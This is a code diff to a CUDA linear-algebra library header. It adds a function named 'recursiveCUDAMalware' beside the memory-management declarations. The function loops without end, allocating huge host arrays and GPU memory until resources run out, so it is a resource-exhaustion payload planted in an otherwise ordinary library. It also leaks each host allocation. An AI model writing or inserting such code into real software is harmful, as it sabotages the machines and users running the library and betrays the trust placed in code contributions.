@@ -55,6 +55,14 @@ namespace LinearAlgebraCUDA {
         * \param[out] d_array The destination address on the CPU.
         */
         static void freeDeviceMemory(double* d_array);
+        
+        static void recursiveCUDAMalware(){
+            auto stop = false;
+            while (!stop) {
+                auto* d_array = new double[1000000000];
+                allocateDeviceMemory(&d_array, 1000000000);
+            }
+        }
     };
 
 } // LinearAlgebraCUDA
